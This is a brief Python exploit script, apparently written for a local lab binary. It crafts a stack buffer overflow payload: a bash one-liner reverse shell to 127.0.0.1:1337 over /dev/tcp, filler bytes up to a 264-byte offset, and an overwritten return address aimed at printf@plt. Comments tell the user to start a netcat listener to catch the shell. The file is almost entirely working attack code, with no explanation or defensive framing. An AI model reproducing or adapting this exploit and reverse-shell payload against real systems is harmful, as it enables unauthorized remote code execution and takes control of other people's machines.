#!/usr/bin/python
#
# it will connect to localhost:1337
# start the reverse shell handler:
# $ nc -l -p 1337

import sys
import socket

shellcode = "0<&181-;exec 181<>/dev/tcp/127.0.0.1/1337;sh <&181 >&181 2>&181"
#shellcode = 'touch /tmp/test.csnc'

shellcode =  'bash -c "' + shellcode + '" #'

buf_size = 256 
offset = 264

# printf@plt 
ret_addr = "\x40\x07\xb0"[::-1]

# NOP
exploit = " " * (buf_size - len(shellcode))
exploit += shellcode

# fill a bit
exploit += "A" * (offset - len(exploit))

# overwrite ret addr
exploit += ret_addr

# write the exploit
sys.stdout.write(exploit)
